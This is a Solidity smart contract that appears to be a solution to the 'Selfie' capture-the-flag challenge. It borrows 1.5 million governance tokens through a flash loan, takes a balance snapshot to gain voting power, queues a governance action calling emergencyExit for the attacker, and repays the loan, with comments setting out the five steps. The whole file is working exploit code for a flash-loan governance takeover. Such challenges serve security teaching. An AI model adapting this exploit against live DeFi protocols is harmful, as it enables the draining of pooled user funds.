// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract AttackSelfie {

    // 1. Request flash loan for all tokens
    // 2. Queue action - emergencyExit(player)
    // 3. Pay back
    // 4. Wait 2 days
    // 5. Execute action


    address immutable player;
    IPool immutable pool;
    IGovernance immutable governance;
    IERC20Snapshot immutable token;
    uint256 constant AMOUNT = 1_500_000 ether;

    constructor(
        address _pool,
        address _governance,
        address _token
    ) {
        player = msg.sender;
        pool = IPool(_pool);
        governance = IGovernance(_governance);
        token = IERC20Snapshot(_token);
    }

    function attack() external {
        pool.flashLoan(
            address(this), address(token), AMOUNT, "0x111"
        );
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        require(tx.origin == player);
        require(msg.sender == address(pool));

        token.snapshot();

        bytes memory _data = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(pool), 0, _data);

        token.approve(address(pool), AMOUNT);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
